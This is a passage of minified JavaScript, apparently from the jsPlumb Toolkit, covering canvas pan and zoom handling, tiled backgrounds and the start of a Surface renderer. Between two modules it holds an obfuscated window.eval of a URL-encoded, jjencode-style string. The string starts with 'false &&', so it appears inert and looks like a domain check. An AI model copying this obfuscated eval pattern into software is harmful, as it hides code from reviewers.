n=-1,o=0;o<ot[e].length;o++)if(ot[e][o][3]===t){n=o;break}-1!==n&&ot[e].splice(n,1)}}n.events=n.events||{};var a,l,d,u,c=this,h=function(){},p=n.canvas,f=n.domElement||function(t){return t},g=f(p),_=n.viewport,b=f(_),v=n.events.zoom||h,m=(n.events.maybeZoom,n.events.pan||h),w=n.events.mousedown||h,j=n.events.mouseup||h,y=n.events.mousemove||h,P=n.events.transformOrigin||h,E=!(!1===n.clamp),x=!1!==n.clampZoom,C=n.panDistance||50,S=!1!==n.enablePan,I=!0===n.directRender,A=!1!==n.enableWheelZoom,T=!1!==n.enableAnimation,k=n.wheelFilter||function(){return!0},D=!0===n.wheelZoomMetaKey,N=(!0===n.wheelReverse?-1:1)*(n.wheelSensitivity||10),M=!0===n.wheelPan,O=!1!==n.enablePanButtons,F=(n.padding,!1!==n.consumeRightClick),L=n.smartMinimumZoom,R=!1,G="mouseup",U="mousemove",z=["webkit","Moz","ms"],V=n.bind,B=n.unbind,H=!(!1===n.enabled),W=n.clampToBackground,X=n.clampToBackgroundExtents,Y=n.filter||function(t){return!1},Z=n.width,q=n.height,J=n.zoom||1,$=[0,0],K=!1,Q=!1,tt=!1,et=!1,nt=n.zoomRange||[.05,3],ot={minx:[],maxx:[],miny:[],maxy:[]},it={},rt={},st={},at=!1,lt=function(){ot.minx.sort(function(t,e){return t[0][0]<e[0][0]?-1:1}),ot.miny.sort(function(t,e){return t[0][1]<e[0][1]?-1:1}),ot.maxx.sort(function(t,e){return t[0][0]+t[1]>e[0][0]+e[1]?-1:1}),ot.maxy.sort(function(t,e){return t[0][1]+t[2]>e[0][1]+e[2]?-1:1})},dt=function(t,e,n,o){null==it[t]&&(it[t]=[],ot.minx.push(it[t]),ot.miny.push(it[t]),ot.maxx.push(it[t]),ot.maxy.push(it[t])),it[t][0]=e,it[t][1]=n,it[t][2]=o,it[t][3]=t,R?at=!0:lt()};this.setBoundsFor=dt,this.setSize=function(t,e,n){null!=it[t]&&(it[t][1]=e,it[t][2]=n,lt())},this.setSuspendRendering=function(t){R=t,!t&&at&&lt(),at=!1};var ut=[],ct=null,ht=null,pt=null,ft=function(){window.clearTimeout(ct),pt&&n.removeClass(pt,"jtk-surface-pan-active"),pt=null},gt=function(t,e){return function(n){var o=Dt(g,10*t,10*e,null);m(o[0],o[1],J,J,n),a&&a.pan(),Wt.pan()}},_t=function(){window.clearTimeout(ht)},bt=function(t,e,o,i,r){var s,l,d,u,c,h=document.createElement("div");h.innerHTML=r||"",h.style.position="absolute";for(var p in e)h.style[p]=e[p];return h.className="jtk-surface-pan jtk-surface-pan-"+t,b.appendChild(h),n.bind(h,"click",(u=o,c=i,function(t){Dt(g,u*C,c*C,null,!0,function(e){m(e[0],e[1],J,J,t),a&&a.pan(),Wt.pan()})})),n.bind(h,"mousedown",(s=o,l=i,d=h,function(){pt=d,n.addClass(pt,"jtk-surface-pan-active"),n.bind(document,"mouseup",ft),ct=window.setTimeout(function(){n.bind(document,G,_t),ht=window.setInterval(gt(s,l),60)},150)})),ut.push(h),h};O&&(bt("top",{left:"0px",top:"0px"},0,-1,"&#8593;"),bt("bottom",{left:"0px",bottom:"0px"},0,1,"&#8595;"),bt("left",{left:"0px",top:"0px"},-1,0,"&#8592;"),bt("right",{right:"0px",top:"0px"},1,0,"&#8594;"));var vt=function(t,e,n){n=n||g;for(var o=0;o<z.length;o++){var i=t.replace(/([a-z]){1}/,function(t){return z[o]+t.toUpperCase()});n.style[i]=e}n.style[t]=e},mt=function(t){vt("transformOrigin",$[0]+"% "+$[1]+"%",t)},wt=function(t,e,n,o){var i,r,s=$[0]/100*e,a=$[1]/100*n;i=-s*(1-J),r=-a*(1-J),$=t,mt(),s=$[0]/100*e,a=$[1]/100*n;var l=Dt(g,-s*(1-J)-i,-a*(1-J)-r,o);P&&P($,l)},jt=function(t,e,o){var i,r,s,a,l,d,u=(i=t,r=e,s=c.mapLocation(i,r),a=[s.left,s.top],l=n.width(p),d=n.height(p),{w:l,h:d,xy:a,xScale:a[0]/l,yScale:a[1]/d,o:[a[0]/l*100,a[1]/d*100]});wt(u.o,u.w,u.h,o)},yt=function(t){var e=Et(t);jt(e[0],e[1],t)},Pt=function(t,e){var o=n.width(p),i=n.height(p);wt([t/o*100,e/i*100],o,i)},Et=function(t){if(null!=t.pageX)return[t.pageX,t.pageY];var e=xt(Ct(t),0);return e?[e.pageX,e.pageY]:[0,0]};this.pageLocation=Et;var xt=function(t,e){return t.item?t.item(e):t[e]},Ct=function(t){return t.touches||[]},St=function(t,e,n,o,i){if(!I&&!(null==t||isNaN(t)||t<0)){var s=nt[0];if(L){s=.5;var l=r().z;t/l<s&&(t=l*s)}else t<s&&(t=s);if(t>nt[1]&&(t=nt[1]),o){var d=t>J?.05:-.05,u=J,c=t<J,h=window.setInterval(function(){u=St(u+d),c&&u<=t&&window.clearInterval(h),!c&&u>=t&&window.clearInterval(h)});return J}vt("transform","scale("+t+")");var p=J;if(J=t,i||v(0,0,J,p,e,n),null!=a&&a.setZoom(t),Wt&&Wt.pan(),x){var f=kt(g),_=Tt(f[0],f[1]);_[0]==f[0]&&_[1]==f[1]||kt(g,_[0],_[1],null,!o)}return J}},It=function(t,e,n,o){e<-150&&(e=-150),e>150&&(e=150),At(d,e,-150,150,n,o)},At=function(t,e,n,o,i,r){var s=t+e/(e>=0?o:n)*(nt[e>=0?1:0]-t);St(s,i,r)},Tt=function(t,e,o){if(E||W||X){var i=Nt(),s=t,l=e,d=E?r():{x:0,y:0,w:0,h:0,vw:n.width(b),vh:n.height(b),padding:o,z:1};if(o=(o||20)*J,(W||X)&&null!=a){var u=a.getWidth(),c=a.getHeight(),h=Math.max(d.x+d.w,u),p=Math.max(d.y+d.h,c);d.w=h-d.w,d.h=p-d.h;var f=d.vw/d.w,g=d.vh/d.h;d.z=Math.min(f,g),X&&(o=Math.max(d.vw,d.vh))}var _=[d.x+d.w,d.y+d.h];a&&(_[0]=Math.max(_[0],a.getWidth()),_[1]=Math.max(_[1],a.getHeight()));var v=t+i[0]+_[0]*J-o,m=e+i[1]+_[1]*J-o,w=t+i[0]+d.x*J+o,j=e+i[1]+d.y*J+o;return v<0&&(s-=v),w>d.vw&&(s-=w-d.vw),m<0&&(l-=m),j>d.vh&&(l-=j-d.vh),[s,l]}return[t,e]},kt=function(t,e,o,i,r,s,a){if(1==arguments.length)return[parseInt(t.style.left,10)||0,parseInt(t.style.top,10)||0];var l=Tt(e,o);return T&&!r&&n.animate?n.animate(t,{left:l[0],top:l[1]},{step:a,complete:function(){s&&s(l)}}):(t.style.left=l[0]+"px",t.style.top=l[1]+"px",s&&s(l)),l};g.style.left="0px",g.style.top="0px";var Dt=function(t,e,n,o,i,r){var s=kt(t);return kt(t,s[0]+e,s[1]+n,o,!i,r)},Nt=function(){var t=n.width(p),e=n.height(p),o=$[0]/100*t,i=$[1]/100*e;return[o*(1-J),i*(1-J)]},Mt={start:function(t,e){if(!Q){var o=t.srcElement||t.target;H&&(o===g||o===b||o._jtkDecoration||a&&a.owns(o)||!0===Y(o,t))&&(et=!1,-1,-1,3!==t.which||!1===n.enableWheelZoom||null!=t.mozInputSource&&1!==t.mozInputSource?e.length<=1&&(K=!0,l=Et(t),u=kt(g)):(tt=!0,l=Et(t),yt(t),u=kt(g),d=J)),w(t,c)}},move:function(t,e){var n,o,i;if(et=!1,!Q){if(tt)i=Et(t),n=i[0]-l[0],o=i[1]-l[1],It(0,o,t);else if(K&&S&&null!=l){n=(i=Et(t))[0]-l[0],o=i[1]-l[1];var r=kt(g,u[0]+n,u[1]+o,t,!0);m(r[0],r[1],J,J,t),a&&a.pan(),Wt&&Wt.pan()}y(t,c)}},end:function(t,e){Q||(tt=!1,l=null,K=!1,et=!1,B(document,U,Ft),B(document,G,Lt),V(document,U,Rt),j(t,c))},contextmenu:function(t){}},Ot=function(t,e){"contextmenu"===t&&F&&e.preventDefault&&e.preventDefault();var n=Ct(e);Mt[t](e,n)},Ft=function(t){Ot("move",t)},Lt=function(t){Ot("end",t)},Rt=function(t){et=!1};V(document,U,Rt);var Gt=function(t){H&&null!=t&&(B(document,U,Rt),V(document,U,Ft),V(document,G,Lt),Mt.start(t,Ct(t)))};if(this.start=Gt,V(_,"mousedown",Gt),V(_,"contextmenu",function(t){Ot("contextmenu",t)}),A){addWheelListener(b,function(t,e,n,o){var i;k(t)&&(t.preventDefault&&t.preventDefault(),t.stopPropagation&&t.stopPropagation(),!M||o?(i=t,d=J,et||(yt(i),et=!0),It(0,i.normalizedWheelDelta*N,i,!0)):o||Ut(100*-e,100*-n))},!0,D)}new PinchListener({el:_,bind:V,unbind:B,enableWheelZoom:n.enableWheelZoom,onPinch:function(t,e,n,o){St(o*d);var i=t[0]-l[0],r=t[1]-l[1];kt(g,u[0]+i,u[1]+r,null,!0)},onPinchStart:function(t,e){Q=!0,e,d=J,jt((l=t)[0],l[1]),u=kt(g)},onPinchEnd:function(){Q=!1,l=null}}),St(J,null,!1,!1,!0),mt(),this.isPinchZooming=function(){return Q},this.positionChanged=function(t,e,o){o=o||n.id(t);var i=e||kt(t),r=n.width(t),s=n.height(t);rt[o]=t,dt(o,i,r,s)},this.add=function(t,e,n,o){this.positionChanged(t,n,e),o&&(V(t,"mousedown",Gt),t._jtkDecoration=!0)},this.suspend=function(t){var e="string"==typeof t?t:n.id(t);st[e]=!0,s(e)},this.isSuspended=function(t){var e="string"==typeof t?t:n.id(t);return!0===st[e]},this.restore=function(t){var e="string"==typeof t?t:n.id(t);delete st[e],this.positionChanged(t,null,e)},this.remove=function(t){t=f(t);var e=n.id(t);delete it[e],delete rt[e],delete st[e],s(e)},this.reset=function(){ot.minx.length=0,ot.miny.length=0,ot.maxx.length=0,ot.maxy.length=0,it={},rt={},st={},kt(g,0,0,null,!0)},this.getBoundsInfo=r,this.zoomToFit=function(t){var e=r((t=t||{}).padding,t.fill);t.doNotZoomIfVisible&&e.z>J||St(e.z),c.centerContent({bounds:e,doNotAnimate:!1!==t.doNotAnimate,onComplete:t.onComplete,onStep:t.onStep,doNotFirePanEvent:t.doNotFirePanEvent})},this.zoomToFitIfNecessary=function(e){var n=t.extend(e||{});n.doNotZoomIfVisible=!0,this.zoomToFit(n)},this.zoomToElements=function(t){for(var e={x:1/0,y:1/0,xMax:-1/0,yMax:-1/0,z:1,vw:n.width(b),vh:n.height(b)},o=0;o<t.elements.length;o++){var i=t.elements[o],r=it[n.id(i)];r&&(e.x=Math.min(e.x,r[0][0]),e.y=Math.min(e.y,r[0][1]),e.xMax=Math.max(e.xMax,r[0][0]+r[1]),e.yMax=Math.max(e.yMax,r[0][1]+r[2]))}var s=t.fill||.9;e.w=e.xMax-e.x,e.h=e.yMax-e.y,e.z=s*Math.min(e.vw/e.w,e.vh/e.h),t.doNotZoomIfVisible&&e.z>J||St(e.z),c.centerContent({bounds:e,doNotAnimate:!1!==t.doNotAnimate,onComplete:t.onComplete,onStep:t.onStep,doNotFirePanEvent:t.doNotFirePanEvent})},this.zoomToBackground=function(t){if(t=t||{},null!=a){var e=a.getWidth(),n=a.getHeight(),o=Z(b),i=q(b),r=o/e,s=i/n,l={w:e,h:n,x:0,y:0,vw:o,vh:i,padding:0,z:Math.min(r,s)};St(l.z),c.centerContent({bounds:l,doNotAnimate:t.doNotAnimate,onComplete:t.onComplete,onStep:t.onStep})}},this.setFilter=function(t){Y=t||function(t){return!1}},this.centerBackground=function(){if(null!=a){var e=t.extend({},r());e.x=a.getWidth()/2,e.y=a.getHeight()/2,e.w=1,e.h=1,c.centerContent({bounds:e,doNotAnimate:n.doNotAnimate,onComplete:n.onComplete,onStep:n.onStep,vertical:!0,horizontal:!0})}},this.alignBackground=function(t){if(null!=a){var e=t.split(" "),n=e[0]||"left",o=e[1]||"top",i=r(),s="left"===n?0:i.vw-a.getWidth()*J,l="top"===o?0:i.vh-a.getHeight()*J,d=Nt();kt(g,s-d[0],l-d[1]),a.pan(),Wt&&Wt.pan()}},this.positionElementAt=function(t,e,o,i,r,s){i=i||0,r=r||0;var a=Nt(),l=kt(g),d=f(t),u=d.parentNode,c=n.offset(u),h=n.offset(_),p=h.left-c.left+(l[0]+a[0])+e*J+i,b=h.top-c.top+(l[1]+a[1])+o*J+r;s&&p<0&&(p=0),s&&b<0&&(b=0),d.style.left=p+"px",d.style.top=b+"px"},this.positionElementAtPageLocation=function(t,e,n,o,i){var r=this.mapLocation(e,n);this.positionElementAt(t,r.left,r.top,o,i)},this.positionElementAtEventLocation=function(t,e,n,o){var i=this.mapEventLocation(e);this.positionElementAt(t,i.left,i.top,n,o)},this.zoomToEvent=function(t,e){yt(t),St(J+e,t)},this.relayout=function(t){if(!1===n.enablePan){g.style.width=t[2]-t[0]+"px",g.style.height=t[3]-t[1]+"px",g.style.left="0",g.style.top="0";var e=t[0]<0?-t[0]:0,o=t[1]<0?-t[1]:0;g.style.transform="translateX("+e+"px) translateY("+o+"px)",this.setTransformOrigin(0,0)}},this.nudgeZoom=function(t,e){var o=n.offset(b,!0),i=o.left+n.width(b)/2,r=o.top+n.height(b)/2;return jt(i,r),St(J+t,e)},this.nudgeWheelZoom=function(t,e){d=J,It(0,t,e,!0)},this.centerContent=function(t){if(!I){var e=(t=t||{}).bounds||r(),n=Nt(),o=e.x*J+e.w*J/2,i=e.y*J+e.h*J/2,s=e.vw/2-o,l=e.vh/2-i,d=kt(g);kt(g,!1!==t.horizontal?s-n[0]:d[0],!1!==t.vertical?l-n[1]:d[1],null,t.doNotAnimate,function(){t.doNotFirePanEvent||m(!1!==t.horizontal?s-d[0]:0,!1!==t.vertical?l-d[1]:0,J,J),a&&a.pan(),Wt&&Wt.pan(),t.onComplete&&t.onComplete()},t.onStep)}},this.centerContentHorizontally=function(e){this.centerContent(t.extend({horizontal:!0,vertical:!1},e))},this.centerContentVertically=function(e){this.centerContent(t.extend({vertical:!0,horizontal:!1},e))},this.centerOn=function(e,n){n=n||{};var o=t.extend({},r()),i=kt(e),s=Z(e),a=q(e);o.x=i[0],o.y=i[1],o.w=s,o.h=a;this.centerContent({bounds:o,doNotAnimate:n.doNotAnimate,onComplete:function(){Pt(i[0]+s/2,i[1]+a/2),n.onComplete&&n.onComplete()},onStep:n.onStep,vertical:!1!==n.vertical,horizontal:!1!==n.horizontal})},this.centerOnHorizontally=function(t){this.centerOn(t,{vertical:!1})},this.centerOnVertically=function(t){this.centerOn(t,{horizontal:!1})},this.centerOnAndZoom=function(t,e){e=e||.6;var n={w:Z(t),h:q(t)},o=kt(t),i=r(),s=i.vw<i.vh?[i.vw,"w"]:[i.vh,"h"],a=e*s[0]/n[s[1]];a<nt[0]&&(a=nt[0]),a>nt[1]&&(a=nt[1]);var l=J,d=a-J;Pt(o[0]+n.w/2,o[1]+n.h/2),this.centerOn(t,{onStep:function(t,e){St(l+t/e*d)},onComplete:function(){St(a)}})},this.getViewportCenter=function(){var e=t.extend({},r()),n=Nt(),o=kt(g),i=[e.vw/2,e.vh/2];return[(i[0]-(o[0]+n[0]))/J,(i[1]-(o[1]+n[1]))/J]},this.setViewportCenter=function(e){var n=t.extend({},r()),o=Nt(),i=[n.vw/2,n.vh/2],s=[-(e[0]*J-i[0]+o[0]),-(e[1]*J-i[1]+o[1])];kt(g,s[0],s[1])},this.setClamping=function(t){E=t},this.setZoom=function(t,e,n){return St(t,null,null,e,n)},this.setZoomRange=function(t,e){return null!=t&&2===t.length&&t[0]<t[1]&&null!=t[0]&&null!=t[1]&&t[0]>0&&t[1]>0&&(nt=t,e||(J<nt[0]||J>nt[1])&&St(J)),nt},this.getZoomRange=function(){return nt},this.getZoom=function(){return J},this.getPan=function(){return kt(g)};var Ut=function(t,e,n){Dt(g,t,e,null,n,function(t){m(t[0],t[1],J,J),a&&a.pan(),Wt&&Wt.pan()})};this.pan=Ut,this.setPan=function(t,e,n,o,i){return kt(g,t,e,null,!n,o,i)},this.setTransformOrigin=function(t,e){$=[t,e],mt()};var zt=this.calculateCumulativeScroll=function(t){for(var e=t,n=0,o=0;null!=e&&e!==document.body;)isNaN(e.scrollLeft)||(n+=e.scrollLeft),isNaN(e.scrollTop)||(o+=e.scrollTop),e=e.parentNode;return{left:n,top:o}},Vt=this.calculateOffset=function(t){for(var e=t,n=0,o=0;null!=e&&e!==document.body;)n+=e.offsetLeft,o+=e.offsetTop,e=e.offsetParent;return{left:n,top:o}};this.mapLocation=function(t,e,n){var o=Nt(),i=kt(g),r=zt(b),s=n?{left:0,top:0}:Vt(b);return{left:(t-(i[0]+o[0])-s.left+r.left)/J,top:(e-(i[1]+o[1])-s.top+r.top)/J}},this.mapEventLocation=function(t,e){var n=Et(t);return this.mapLocation(n[0],n[1],e)},this.setEnabled=function(t){H=t},this.showElementAt=function(t,e,o){var i=f(t).parentNode,r=n.offset(i),s=n.offset(_),a=Nt(),l=r.left-s.left+a[0]+e,d=r.top-s.top+a[1]+o;n.offset(t,{left:l,top:d})},this.getApparentCanvasLocation=function(){var t=Nt(),e=kt(g);return[e[0]+t[0],e[1]+t[1]]},this.setApparentCanvasLocation=function(t,e){var n=Nt(),o=kt(g,t-n[0],e-n[1],null,!0);return a&&a.pan(),Wt&&Wt.pan(),o},this.applyZoomToElement=function(t,e){vt("transform","scale("+(e=e||J)+")",t)},this.setTransformOriginForElement=function(t,e){vt("transformOrigin",e[0]+" "+e[1],t)},this.getTransformOrigin=function(){return $},this.floatElement=function(t,e){null!=t&&(t.style.position="absolute",t.style.left=e[0]+"px",t.style.top=e[1]+"px",b.appendChild(t))};var Bt={},Ht=function(t){var e=c.getApparentCanvasLocation();for(var n in Bt)if(Bt.hasOwnProperty(n)){if(null!=t&&t!==n)continue;var o=Bt[n],i=function(t,n){o[t]&&(e[n]/J+o.pos[n]<0?o.el.style[t]=-e[n]/J+"px":o.el.style[t]=o.pos[n]+"px")};i("left",0),i("top",1)}},Wt={pan:Ht};this.fixElement=function(t,e,o){if(null!=t){e=e||{};var i=n.id(t);Bt[i]={el:t,left:e.left,top:e.top,pos:o},t.style.position="absolute",t.style.left=o[0]+"px",t.style.top=o[1]+"px",g.appendChild(t),Ht(i)}},this.findIntersectingNodes=function(t,e,o,i,r){var s,a=this.getApparentCanvasLocation(),l=n.offset(b),d=b.scrollLeft,u=b.scrollTop,c=[],h={x:t[0],y:t[1],w:e[0],h:e[1]},p=o?Biltong.encloses:Biltong.intersects,f=[l.left+a[0]-d,l.top+a[1]-u];if(r=r||it,Array.isArray(r)){var g={};for(s=0;s<r.length;s++)g[jsPlumbUtil.isString(r[s])?r[s]:jsPlumb.getId(r[s])]=r[s];r=g}for(s in r)if(!st[s]){var _=it[s];if(_){var v={x:f[0]+_[0][0]*J,y:f[1]+_[0][1]*J,w:_[1]*J,h:_[2]*J};p(h,v)&&(null==i||i(s,rt[s],v))&&c.push({id:s,el:rt[s],r:v})}}return c},this.findNearbyNodes=function(t,e,n,o){var i=[];if(!n||this.isInViewport(t[0],t[1])){i=this.findIntersectingNodes([t[0]-e,t[1]-e],[2*e,2*e],!1,o);var r=this.mapLocation(t[0],t[1]);i.sort(function(t,e){var n=[t.x+t.w/2,t.y+t.h/2],o=[e.x+e.w/2,e.y+e.h/2],i=Biltong.lineLength(r,n),s=Biltong.lineLength(r,o);return i<s?-1:i>s?1:0})}return i},this.isInViewport=function(t,e){var o=n.offset(b),i=n.width(b),r=n.height(b);return o.left<=t&&t<=o.left+i&&o.top<=e&&e<=o.top+r},this.getElementPositions=function(){return it},this.setFilter=function(t){Y=t||function(t){return!1}},this.setWheelFilter=function(t){k=t||function(t){return!0}},this.setBackground=function(t){var n=t.type||"simple",r={simple:e,tiled:"absolute"===t.tiling?i:o};a=new r[n]({canvas:g,viewport:b,getWidth:Z,getHeight:q,url:t.url,zoomWidget:c,onBackgroundReady:t.onBackgroundReady,options:t,img:t.img,resolver:t.resolver})},n.background&&this.setBackground(n.background),this.getBackground=function(){return a},this.destroy=function(){n.bind(document,"mouseup",ft);for(var t=0;t<ut.length;t++)ut[t].parentNode.removeChild(ut[t])}};var e=function(t){var e=t.canvas,n=t.onBackgroundReady||function(){},o=new Image;o.onload=function(){e.style.backgroundImage="url('"+o.src+"')",e.style.backgroundRepeat="no-repeat",e.style.width=o.width+"px",e.style.height=o.height+"px",n(this)},o.src=t.img?t.img.src:t.url,this.owns=function(t){return t===e},this.getWidth=function(){return o.width||0},this.getHeight=function(){return o.height||0},this.setZoom=this.pan=function(t){}},n=function(t){var e=this,n=t.canvas,o=t.viewport;if(null==t.options.maxZoom)throw new TypeError("Parameter `maxZoom` not set; cannot initialize TiledBackground");if(!t.options.tileSize)throw new TypeError("Parameter `tileSize not set; cannot initialize TiledBackground. It should be an array of [x,y] values.");if(!t.options.width||!t.options.height)throw new TypeError("Parameters `width` and `height` must be set");for(var i=function(n){var o=document.createElement("div");o.style.position="relative",o.style.height="100%",o.style.width="100%",o.style.display="none",t.canvas.appendChild(o),this.zoom=n;var i=e.getTileSpecs(n),r=[],s=function(e,n,o){return null==t.resolver?(i=e,r=n,s=o,t.url.replace("{z}",i).replace("{x}",r).replace("{y}",s)):t.resolver(e,n,o);var i,r,s};this.apparentZoom=Math.min(i[2],i[3]),this.setActive=function(t){o.style.display=t?"block":"none"},this.xTiles=i[0],this.yTiles=i[1];for(var a=0;a<this.xTiles;a++){r[a]=r[a]||[];for(var l=0;l<this.yTiles;l++){var d=document.createElement("img");d._tiledBg=!0,d.className="jtk-surface-tile",d.ondragstart=function(){return!1},o.appendChild(d),d.style.position="absolute",d.style.opacity=0,r[a][l]=[d,new Image,!1]}}var u=Math.pow(2,t.options.maxZoom-n)*t.options.tileSize[0],c=Math.pow(2,t.options.maxZoom-n)*t.options.tileSize[1];this.scaledImageSize=u,this.scaledImageSizeH=c;var h=function(t,e,o,i){t.style.left=o*u+"px",t.style.top=i*c+"px",t.style.width=u+"px",t.style.height=c+"px",e.onload=function(){t.setAttribute("src",e.src),t.style.opacity=1},e.src=s(n,o,i)};this.ensureLoaded=function(t,e,n,o){for(var i=t;i<=n;i++)for(var s=e;s<=o;s++)null!=r[i]&&null!=r[i][s]&&(r[i][s][2]||(h(r[i][s][0],r[i][s][1],i,s),r[i][s][2]=!0))}}.bind(this),r=[],s=null,a=0;a<=t.options.maxZoom;a++)r.push(new i(a));n.style.width=t.options.width+"px",n.style.height=t.options.height+"px";var l,d=function(){var e=t.zoomWidget.getApparentCanvasLocation(),n=t.getWidth(o),i=t.getHeight(o),r=s.scaledImageSize*l,a=s.scaledImageSizeH*l,d=e[0]<0?Math.floor(-e[0]/r):e[0]<n?0:null,u=e[1]<0?Math.floor(-e[1]/a):e[1]<i?0:null,c=Math.min(s.xTiles,Math.floor((n-e[0])/r)),h=Math.min(s.yTiles,Math.floor((i-e[1])/a));null!=d&&null!=u&&s.ensureLoaded(d,u,c,h)};this.getCurrentLayer=function(){return s},this.getWidth=function(){return t.options.width},this.getHeight=function(){return t.options.height};var u=t.options.panDebounceTimeout||50,c=t.options.zoomDebounceTimeout||120,h=function(t,e){e=e||150;var n=null;return function(){window.clearTimeout(n),n=window.setTimeout(t,e)}},p=function(){var t,e;t=function(){if(l<=r[0].apparentZoom)return 0;if(l>=r[r.length-1].apparentZoom)return r.length-1;for(var t=r.length-1;t>0;t--)if(r[t].apparentZoom>=l&&l>=r[t-1].apparentZoom)return t}(),e=r[t],null!=s&&s!==e&&s.setActive(!1),e.setActive(!0),s=e,d()},f=h(p,c),g=h(d,u);this.setZoom=function(t,e){l=t,e?p():f()},this.pan=g,this.owns=function(t){return t===n||!0===t._tiledBg},this.setZoom(t.zoomWidget.getZoom(),!0),null!=t.onBackgroundReady&&setTimeout(t.onBackgroundReady,0)},o=function(t){var e=t.options.width,o=t.options.height,i=t.options.tileSize;this.getTileSpecs=function(t){var n=e>o?1:e/o,r=o>e?1:o/e,s=Math.pow(2,t+1)*i[0]*n,a=Math.pow(2,t+1)*i[1]*r;return[Math.ceil(s/i[0]),Math.ceil(a/i[1]),s/e,a/o]},n.apply(this,arguments)},i=function(t){var e=t.options.maxZoom,o=t.options.width,i=t.options.height,r=t.options.tileSize;this.getTileSpecs=function(t){var n=Math.pow(2,e-t),s=Math.ceil(o/n/r[0]),a=Math.ceil(i/n/r[1]);return[s,a,s*r[0]/o,a*r[1]/i]},n.apply(this,arguments)}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this.jsPlumbToolkit,e=t.Renderers,n=this.jsPlumb,o=this.jsPlumbUtil,i=n.getSelector,r=t.Classes,s=t.Constants,a=t.Events;e.Surface=function(l){function d(t){return null==t?null:"string"==typeof t?this.getRenderedConnection(t):t.constructor==n.Connection?t:c.getRenderedConnection(t.getId())}function u(){if(!h.jsPlumb.startEditing)throw new TypeError("Connection editors not available.")}var c=this;e.Surface.SELECT=s.select,e.Surface.PAN=s.pan,e.Surface.DISABLED=s.disabled;var h=e.AbstractRenderer.apply(this,arguments);e.DOMElementAdapter.apply(this,arguments),this.getObjectInfo=h.getObjectInfo,l=l||{};var p,f=n.getElement(l.container),g=e.createElement({position:s.relative,width:s.nominalSize,height:s.nominalSize,left:0,top:0,clazz:r.SURFACE_CANVAS},f),_=!0!==l.directRender&&!(!1===l.elementsDraggable),b=!0!==l.directRender&&!0===l.elementsDroppable,v=l.dragOptions||{},m=l.dropOptions||{},w=l.stateHandle,j=!1!==l.storePositionsInModel,y=l.modelLeftAttribute,P=l.modelTopAttribute,E=!0===l.directRender,x=new ZoomWidget({viewport:f,canvas:g,domElement:h.jsPlumb.getElement,addClass:h.jsPlumb.addClass,removeClass:h.jsPlumb.removeClass,offset:this.getOffset,consumeRightClick:l.consumeRightClick,bind:function(){h.jsPlumb.on.apply(h.jsPlumb,arguments)},unbind:function(){h.jsPlumb.off.apply(h.jsPlumb,arguments)},width:function(t){return h.jsPlumb.getWidth(h.jsPlumb.getElement(t))},height:function(t){return h.jsPlumb.getHeight(h.jsPlumb.getElement(t))},id:h.jsPlumb.getId,animate:function(){h.jsPlumb.animate.apply(h.jsPlumb,arguments)},dragEvents:{stop:n.dragEvents[s.stop],start:n.dragEvents[s.start],drag:n.dragEvents[s.drag]},background:l.background,padding:l.padding,panDistance:l.panDistance,directRender:E,enablePan:!E&&!1!==l.enablePan,enableWheelZoom:!E&&!1!==l.enableWheelZoom,wheelSensitivity:l.wheelSensitivity,wheelReverse:l.wheelReverse,wheelZoomMetaKey:l.wheelZoomMetaKey,wheelPan:l.wheelPan,enablePanButtons:!E&&!1!==l.enablePanButtons,enableAnimation:l.enableAnimation,clamp:l.clamp,clampZoom:l.clampZoom,clampToBackground:l.clampToBackground,clampToBackgroundExtents:l.clampToBackgroundExtents,zoom:l.zoom,zoomRange:l.zoomRange,extend:h.jsPlumb.extend,events:{pan:function(t,e,n,o,i){c.fire(a.pan,{x:t,y:e,zoom:n,oldZoom:o,event:i})},zoom:function(t,e,n,o,i){h.jsPlumb.setZoom(n),c.fire(a.zoom,{x:t,y:e,zoom:n,oldZoom:o,event:i})},mousedown:function(){n.addClass(f,r.SURFACE_PANNING),n.addClass(document.body,r.SELECT_DEFEAT)},mouseup:function(){n.removeClass(f,r.SURFACE_PANNING),n.removeClass(document.body,r.SELECT_DEFEAT)}}}),C=[],S=l.lassoSelectionFilter,I=!1!==l.autoExitSelectMode,A=new t.Widgets.Lasso({on:function(){h.jsPlumb.on.apply(h.jsPlumb,arguments)},off:function(){h.jsPlumb.off.apply(h.jsPlumb,arguments)},invert:l.lassoInvert,pageLocation:x.pageLocation,canvas:f,onStart:function(){c.setHoverSuspended(!0),C.length=0},onSelect:function(t,e,n,o){function i(t){return t.el.jtk.node||t.el.jtk.group}h.jsPlumb.clearDragSelection&&h.jsPlumb.clearDragSelection(),h.toolkit.clearSelection(),o&&C.length>0&&h.toolkit.removeFromSelection(C);for(var 